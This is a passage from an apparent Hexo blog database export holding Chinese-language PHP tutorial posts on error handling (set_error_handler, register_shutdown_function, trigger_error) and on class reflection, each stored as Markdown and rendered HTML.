结语\n\n在PHP中，错误和异常是两个不同的概念，这种设计从根本上导致了PHP的异常和其他语言相异。以Java为例，Java中，异常是错误唯一的报告方式。说到底，两者的区别就是对异常和错误的认识不同而产生的。PHP的异常绝大部分必须通过某种办法手动抛出，才能被捕获到，是一种半自动化的异常处理机制。 无论是错误还是异常，都可以使用handler接管系统已有的处理机制","slug":"2019/6/PHP中的错误处理","published":1,"date":"2019-06-26T05:36:09.298Z","updated":"2020-04-12T06:34:43.624Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzo000z44vqnmxvfqu5","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>PHP里有一套错误处理机制，可以使用set_error_handler接管PHP错误处理，也可以使用trigger_error函数主动抛出一个错误。</p>\n<a id=\"more\"></a>\n<h3 id=\"set-error-handler\"><a href=\"#set-error-handler\" class=\"headerlink\" title=\"set_error_handler\"></a>set_error_handler</h3><p>set_error_handler()函数设置用户自定义的错误处理函数。函数用于创建运行期间的用户自己的错误处理方法。它需要先创建一个错误处理函数，然后设置错误级别。语法如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set_error_handler(error_function, error_type)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>error_function :发生错误时运行的函数</li>\n<li>error_type : 错误级别，默认为E_ALL</li>\n</ul>\n<p>如果使用该函数，会完全绕过PHP错误处理函数，如果有必要，自定义的错误处理程序必须终止脚本</p>\n<p>如果在脚本执行前发生错误，那时自定义程序还没有注册，就不会用到自定义错误处理程序</p>\n<h3 id=\"自定义异常处理\"><a href=\"#自定义异常处理\" class=\"headerlink\" title=\"自定义异常处理\"></a>自定义异常处理</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">customError</span><span class=\"params\">($errno, $errstr, $errfile, $errline)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'错误代码:'</span>$errno.$errstr;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'错误所在:'</span>$errfile.$errline;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set_error_handler(customError, E_ALL|E_STRICT);</span><br><span class=\"line\"></span><br><span class=\"line\">$a = [<span class=\"string\">'o'</span> =&gt; <span class=\"number\">2</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a[<span class=\"string\">'o'</span>];</span><br></pre></td></tr></table></figure>\n<p>自定义的错误处理函数一定要有这四个输入变量＄errno、＄errstr、＄errfile、＄errline</p>\n<p>errno是一组常量，代表错误的等级，同时也有一组整数和其对应，但一般使用其字符串值表示，这样语义更好一点。比如E_WARNING，其二进制掩码为4.，表示警告信息</p>\n<p>接下来，就是将这个函数作为回调参数传递给set_error_handler。这样就能接管PHP原生的错误处理函数了。要注意的是，这种托管方式并不能托管所有种类的错误，如E_ERROR、E_PARSE、E_CORE_ERROR、E_CORE_WARNING、E_COMPILE_ERROR、E_COMPILE_WARNING，以及E_STRICT中的部分。这些错误会以最原始的方式显示，或者不显示</p>\n<h3 id=\"restore-error-handler\"><a href=\"#restore-error-handler\" class=\"headerlink\" title=\"restore_error_handler\"></a>restore_error_handler</h3><p>set_error_handler函数会接管PHP内置的错误处理，可以在同一个页面使用restore_error_handler()；取消接管</p>\n<p>如果使用自定义的set_error_handler接管PHP的错误处理，代码里的错误抑制@将失效，这种错误也会被显示</p>\n<p>在PHP异常中，异常处理机制是有限的，无法自动抛出异常，必须手动进行，并且内置异常有限。PHP把许多异常看作错误，这样就可以把这些“异常”像错误一样用set_error_handler接管，进而主动抛出异常</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">customError</span><span class=\"params\">($errno, $errstr, $errfile, $errline)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"keyword\">Exception</span>($errno.<span class=\"string\">'|'</span>.$errstr);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set_error_handler(<span class=\"string\">'customError'</span>, E_ALL|E_STRICT);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $a = <span class=\"number\">5</span>/<span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">catch</span>(<span class=\"keyword\">Exception</span> $e)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $e-&gt;getMessage();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这样就能捕获到异常和非致命的错误，可以弥补PHP异常处理机制的部分不足</p>\n<h3 id=\"register-shutdown-function\"><a href=\"#register-shutdown-function\" class=\"headerlink\" title=\"register_shutdown_function\"></a>register_shutdown_function</h3><p>fetal error这样的错误捕获不到，也无法在发生此错误后恢复流程处理，但是还是可以使用一些特殊方法对这种错误进行处理。这需要用到<code>register_shutdown_function()</code></p>\n<p>此函数会在PHP程序终止或者die时触发一个函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shutdown</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">stop</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (error_get_last()) &#123;</span><br><span class=\"line\">            print_r(error_get_last);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Stop'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    register_shutdown_function([<span class=\"keyword\">new</span> Shutdown(), <span class=\"string\">'stop'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    $a = <span class=\"keyword\">new</span> a();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'end'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对于fetal error还能做点收尾工作，但是PHP流程的终止是必然的。对于Parse error级别的错误，除了可以修改配置文件php.ini，什么都做不了</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">log_errors</span> = <span class=\"literal\">On</span></span><br><span class=\"line\"><span class=\"attr\">error_log</span> = usr/log/php.log</span><br></pre></td></tr></table></figure>\n<p>这样一旦PHP发生了错误，就会被记入log文件，方便以后查询</p>\n<h3 id=\"trigger-error\"><a href=\"#trigger-error\" class=\"headerlink\" title=\"trigger_error\"></a>trigger_error</h3><p>和exception类似，错误处理也有对应抛出错误的函数，那就是trigger_error函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$d = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($d == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    trigger_error(<span class=\"string\">'cannot d by zero'</span>, E_USER_ERROR);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'break'</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h3><p>在PHP中，错误和异常是两个不同的概念，这种设计从根本上导致了PHP的异常和其他语言相异。以Java为例，Java中，异常是错误唯一的报告方式。说到底，两者的区别就是对异常和错误的认识不同而产生的。PHP的异常绝大部分必须通过某种办法手动抛出，才能被捕获到，是一种半自动化的异常处理机制。 无论是错误还是异常，都可以使用handler接管系统已有的处理机制</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>PHP里有一套错误处理机制，可以使用set_error_handler接管PHP错误处理，也可以使用trigger_error函数主动抛出一个错误。</p>","more":"<h3 id=\"set-error-handler\"><a href=\"#set-error-handler\" class=\"headerlink\" title=\"set_error_handler\"></a>set_error_handler</h3><p>set_error_handler()函数设置用户自定义的错误处理函数。函数用于创建运行期间的用户自己的错误处理方法。它需要先创建一个错误处理函数，然后设置错误级别。语法如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set_error_handler(error_function, error_type)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>error_function :发生错误时运行的函数</li>\n<li>error_type : 错误级别，默认为E_ALL</li>\n</ul>\n<p>如果使用该函数，会完全绕过PHP错误处理函数，如果有必要，自定义的错误处理程序必须终止脚本</p>\n<p>如果在脚本执行前发生错误，那时自定义程序还没有注册，就不会用到自定义错误处理程序</p>\n<h3 id=\"自定义异常处理\"><a href=\"#自定义异常处理\" class=\"headerlink\" title=\"自定义异常处理\"></a>自定义异常处理</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">customError</span><span class=\"params\">($errno, $errstr, $errfile, $errline)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'错误代码:'</span>$errno.$errstr;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'错误所在:'</span>$errfile.$errline;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set_error_handler(customError, E_ALL|E_STRICT);</span><br><span class=\"line\"></span><br><span class=\"line\">$a = [<span class=\"string\">'o'</span> =&gt; <span class=\"number\">2</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a[<span class=\"string\">'o'</span>];</span><br></pre></td></tr></table></figure>\n<p>自定义的错误处理函数一定要有这四个输入变量＄errno、＄errstr、＄errfile、＄errline</p>\n<p>errno是一组常量，代表错误的等级，同时也有一组整数和其对应，但一般使用其字符串值表示，这样语义更好一点。比如E_WARNING，其二进制掩码为4.，表示警告信息</p>\n<p>接下来，就是将这个函数作为回调参数传递给set_error_handler。这样就能接管PHP原生的错误处理函数了。要注意的是，这种托管方式并不能托管所有种类的错误，如E_ERROR、E_PARSE、E_CORE_ERROR、E_CORE_WARNING、E_COMPILE_ERROR、E_COMPILE_WARNING，以及E_STRICT中的部分。这些错误会以最原始的方式显示，或者不显示</p>\n<h3 id=\"restore-error-handler\"><a href=\"#restore-error-handler\" class=\"headerlink\" title=\"restore_error_handler\"></a>restore_error_handler</h3><p>set_error_handler函数会接管PHP内置的错误处理，可以在同一个页面使用restore_error_handler()；取消接管</p>\n<p>如果使用自定义的set_error_handler接管PHP的错误处理，代码里的错误抑制@将失效，这种错误也会被显示</p>\n<p>在PHP异常中，异常处理机制是有限的，无法自动抛出异常，必须手动进行，并且内置异常有限。PHP把许多异常看作错误，这样就可以把这些“异常”像错误一样用set_error_handler接管，进而主动抛出异常</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">customError</span><span class=\"params\">($errno, $errstr, $errfile, $errline)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"keyword\">Exception</span>($errno.<span class=\"string\">'|'</span>.$errstr);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set_error_handler(<span class=\"string\">'customError'</span>, E_ALL|E_STRICT);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $a = <span class=\"number\">5</span>/<span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">catch</span>(<span class=\"keyword\">Exception</span> $e)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $e-&gt;getMessage();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这样就能捕获到异常和非致命的错误，可以弥补PHP异常处理机制的部分不足</p>\n<h3 id=\"register-shutdown-function\"><a href=\"#register-shutdown-function\" class=\"headerlink\" title=\"register_shutdown_function\"></a>register_shutdown_function</h3><p>fetal error这样的错误捕获不到，也无法在发生此错误后恢复流程处理，但是还是可以使用一些特殊方法对这种错误进行处理。这需要用到<code>register_shutdown_function()</code></p>\n<p>此函数会在PHP程序终止或者die时触发一个函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shutdown</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">stop</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (error_get_last()) &#123;</span><br><span class=\"line\">            print_r(error_get_last);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Stop'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    register_shutdown_function([<span class=\"keyword\">new</span> Shutdown(), <span class=\"string\">'stop'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    $a = <span class=\"keyword\">new</span> a();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'end'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对于fetal error还能做点收尾工作，但是PHP流程的终止是必然的。对于Parse error级别的错误，除了可以修改配置文件php.ini，什么都做不了</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">log_errors</span> = <span class=\"literal\">On</span></span><br><span class=\"line\"><span class=\"attr\">error_log</span> = usr/log/php.log</span><br></pre></td></tr></table></figure>\n<p>这样一旦PHP发生了错误，就会被记入log文件，方便以后查询</p>\n<h3 id=\"trigger-error\"><a href=\"#trigger-error\" class=\"headerlink\" title=\"trigger_error\"></a>trigger_error</h3><p>和exception类似，错误处理也有对应抛出错误的函数，那就是trigger_error函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$d = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($d == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    trigger_error(<span class=\"string\">'cannot d by zero'</span>, E_USER_ERROR);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'break'</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h3><p>在PHP中，错误和异常是两个不同的概念，这种设计从根本上导致了PHP的异常和其他语言相异。以Java为例，Java中，异常是错误唯一的报告方式。说到底，两者的区别就是对异常和错误的认识不同而产生的。PHP的异常绝大部分必须通过某种办法手动抛出，才能被捕获到，是一种半自动化的异常处理机制。 无论是错误还是异常，都可以使用handler接管系统已有的处理机制</p>"},{"layout":"post","title":"PHP类反射","abbrlink":46494,"date":"2019-06-11T04:07:06.000Z","_content":"\n### 前言\n\n面向对象编程中对象被赋予了自省的能力，而这个自省的过程就是反射，反射直观的理解就是根据到达地找出出发地和来源\n\n反射指在PHP运行状态中，扩展分析PHP程序，到处或提取出类，方法，属性，参数等详细信息，包括注释\n\n<!--more-->\n\n### 示例\n\n```php\n\n<?php\n\nclass Person {\n    public $name;\n    public $gender;\n\n    public function say()\n    {\n        echo $this->name ':' $this->gender;\n    }\n\n    public function __set($name, $value)\n    {\n        echo 'setting $name to $value';\n\n        $this->$name = $value;\n    }\n\n    public function __get($name)\n    {\n        if (!isset($this->$name)) {\n            echo '未设置';\n            $this->$name = '默认值';\n\n        }\n\n        return $this->$name;\n    }\n}\n```\n\n```\n$student = new Person();\n\n$student->name = 'Ton';\n$student->gender = 'male';\n$student->age = '24';\n```\n\n### 使用API获取属性和方法\n\n```php\n//获取对象属性列表\n\n$reflect = new ReflectionObject($student);\n$props = $reflect->getProperties();\n\nforeach ($props as $prop) {\n    print $prop->getName();\n}\n\n//获取对象方法列表\n$m = $reflect->getMethods();\nforeach ($m as $prop) {\n    print $prop->getName();\n}\n```\n\n### 使用class函数获取属性和方法\n\n```php\n//返回对象属性的关联数组\nvar_dump(get_object_vars($student));\n//类属性\nvar_dump(get_class_vars(get_class($student)));\n//返回由类的方法组成的数组\nvar_dump(get_class_methonds(get_class($student)));\n```\n\n### 获取对象属于哪个类\n\n```php\necho get_class($student);\n```\n\n\n### 还原类原型\n\n```php\n//反射获取类的原型\n$obj = new ReflectionClass('person');\n$className = $obj->getName();\n$methods = $properties = [];\n\nforeach ($obj->getProperties() as $v) {\n    $properties[$v->getName()] = $v;\n}\n\nforeach ($obj->getMethods() as $v) {\n    $methods[$v->getName()] = $v;\n}\n\necho \"class {$className}\";\n\nis_array($properties) && ksort($properties);\n\nforeach($properties as $k => $v) {\n    echo $v->isPublic ? 'public' : '';\n    echo $v->isPrivate ? 'private' : '';\n    echo $v->isProtected ? 'protected' : '';\n    echo $v->static ? 'static' : '';\n}\n\nif (is_array($methods)) ksort($methods);\n\nforeach ($methods as $k => $v) {\n    echo \"function{$k}(){}\";\n}\n\n```\n\nPHP手册关于反射API有几十个，反射完整的描述了一个类或对象的原型，反射不仅可以用于类和对象，还可以用于函数，扩展模块，异常等\n\n### 结语\n\n善用反射能保持代码的优雅和简洁，但反射也会破坏类的封装性，因为反射可以使本不该暴露的方法或属性被强制暴露了出来，是优点也是缺点","source":"_posts/2019/6/PHP类反射.md","raw":"---\nlayout: post\ntitle: PHP类反射\ntags:\n  - php\ncategories:\n  - php\nabbrlink: 46494\ndate: 2019-06-11 12:07:06\n---\n\n### 前言\n\n面向对象编程中对象被赋予了自省的能力，而这个自省的过程就是反射，反射直观的理解就是根据到达地找出出发地和来源\n\n反射指在PHP运行状态中，扩展分析PHP程序，到处或提取出类，方法，属性，参数等详细信息，包括注释\n\n<!--more-->\n\n### 示例\n\n```php\n\n<?php\n\nclass Person {\n    public $name;\n    public $gender;\n\n    public function say()\n    {\n        echo $this->name ':' $this->gender;\n    }\n\n    public function __set($name, $value)\n    {\n        echo 'setting $name to $value';\n\n        $this->$name = $value;\n    }\n\n    public function __get($name)\n    {\n        if (!isset($this->$name)) {\n            echo '未设置';\n            $this->$name = '默认值';\n\n        }\n\n        return $this->$name;\n    }\n}\n```\n\n```\n$student = new Person();\n\n$student->name = 'Ton';\n$student->gender = 'male';\n$student->age = '24';\n```\n\n### 使用API获取属性和方法\n\n```php\n//获取对象属性列表\n\n$reflect = new ReflectionObject($student);\n$props = $reflect->getProperties();\n\nforeach ($props as $prop) {\n    print $prop->getName();\n}\n\n//获取对象方法列表\n$m = $reflect->getMethods();\nforeach ($m as $prop) {\n    print $prop->getName();\n}\n```\n\n### 使用class函数获取属性和方法\n\n```php\n//返回对象属性的关联数组\nvar_dump(get_object_vars($student));\n//类属性\nvar_dump(get_class_vars(get_class($student)));\n//返回由类的方法组成的数组\nvar_dump(get_class_methonds(get_class($student)));\n```\n\n### 获取对象属于哪个类\n\n```php\necho get_class($student);\n```\n\n\n### 还原类原型\n\n```php\n//反射获取类的原型\n$obj = new ReflectionClass('person');\n$className = $obj->getName();\n$methods = $properties = [];\n\nforeach ($obj->getProperties() as $v) {\n    $properties[$v->getName()] = $v;\n}\n\nforeach ($obj->getMethods() as $v) {\n    $methods[$v->getName()] = $v;\n}\n\necho \"class {$className}\";\n\nis_array($properties) && ksort($properties);\n\nforeach($properties as $k => $v) {\n    echo $v->isPublic ? 'public' : '';\n    echo $v->isPrivate ? 'private' : '';\n    echo $v->isProtected ? 'protected' : '';\n    echo $v->static ? 'static' : '';\n}\n\nif (is_array($methods)) ksort($methods);\n\nforeach ($methods as $k => $v) {\n    echo \"function{$k}(){}\";\n}\n\n```\n\nPHP手册关于反射API有几十个，反射完整的描述了一个类或对象的原型，反射不仅可以用于类和对象，还可以用于函数，扩展模块，异常等\n\n### 结语\n\n善用反射能保持代码的优雅和简洁，但反射也会破坏类的封装性，因为反射可以使本不该暴露的方法或属性被强制暴露了出来，是优点也是缺点","slug":"2019/6/PHP类反射","published":1,"updated":"2020-04-12T06:34:43.624Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzp001444vqwdzgy6be","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>面向对象编程中对象被赋予了自省的能力，而这个自省的过程就是反射，反射直观的理解就是根据到达地找出出发地和来源</p>\n<p>反射指在PHP运行状态中，扩展分析PHP程序，到处或提取出类，方法，属性，参数等详细信息，包括注释</p>\n<a id=\"more\"></a>\n<h3 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $gender;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">say</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;name <span class=\"string\">':'</span> <span class=\"keyword\">$this</span>-&gt;gender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__set</span><span class=\"params\">($name, $value)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'setting $name to $value'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;$name = $value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span><span class=\"params\">($name)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;$name)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'未设置'</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;$name = <span class=\"string\">'默认值'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;$name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span 